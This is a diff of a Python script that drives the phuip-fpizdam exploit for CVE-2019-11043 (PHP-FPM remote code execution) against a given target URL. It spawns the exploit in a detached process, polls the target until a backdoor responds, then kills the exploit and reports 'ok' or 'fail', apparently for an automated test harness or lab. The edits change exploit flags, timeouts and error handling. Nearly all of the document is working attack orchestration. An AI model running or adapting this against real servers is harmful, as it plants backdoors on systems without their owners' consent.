@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-"""CVE-2019-11043: spawn phuip-fpizdam once, probe target for active backdoor."""
+"""CVE-2019-11043: probe + detached attacker. Returns WITHOUT trailing newline."""
 import subprocess, sys, os, signal, time, urllib.request
 
 if len(sys.argv) < 2:
-    print("fail", flush=True)
+    print("fail", end="", flush=True)
     sys.exit(0)
 
 target_url = sys.argv[1]
@@ -28,47 +28,41 @@ def is_running():
     except:
         return False
 
-# Fast path: already poisoned
+# Fast path
 if probe():
-    print("ok", flush=True)
+    print("ok", end="", flush=True)
     sys.exit(0)
 
-# Spawn phuip-fpizdam only if not already running (persists across attempts)
+# Spawn phuip-fpizdam once (persists across attempts)
 if not is_running():
     try: os.remove(PID_FILE)
     except: pass
     try:
         with open(LOG, "a") as logf:
             proc = subprocess.Popen(
-                [GO_BIN, "--skip-detect", "--qsl", "1755", "--pisos", "182", target_url],
+                [GO_BIN, target_url],   # WITHOUT --skip-detect
                 stdout=logf, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                 start_new_session=True,
             )
         with open(PID_FILE, "w") as f:
             f.write(str(proc.pid))
-    except Exception as e:
-        with open(LOG, "a") as logf:
-            logf.write(f"\n[spawn fail] {e}\n")
-        print("fail", flush=True)
-        sys.exit(0)
+    except Exception:
+        pass
 
-# Probe for up to 20s
-deadline = time.time() + 20
+# Probe for 12s (per attempt). Background phuip-fpizdam keeps working.
+deadline = time.time() + 12
 while time.time() < deadline:
     time.sleep(0.4)
     if probe():
-        # Backdoor active! Kill phuip-fpizdam (stop cleanup hang)
         try:
             with open(PID_FILE) as f:
                 pid = int(f.read().strip())
             os.killpg(os.getpgid(pid), signal.SIGKILL)
-        except:
-            pass
+        except: pass
         try: os.remove(PID_FILE)
         except: pass
-        print("ok", flush=True)
+        print("ok", end="", flush=True)
         sys.exit(0)
 
-# Timeout - keep phuip-fpizdam running for next attempt
-print("fail", flush=True)
+print("fail", end="", flush=True)
 sys.exit(0)
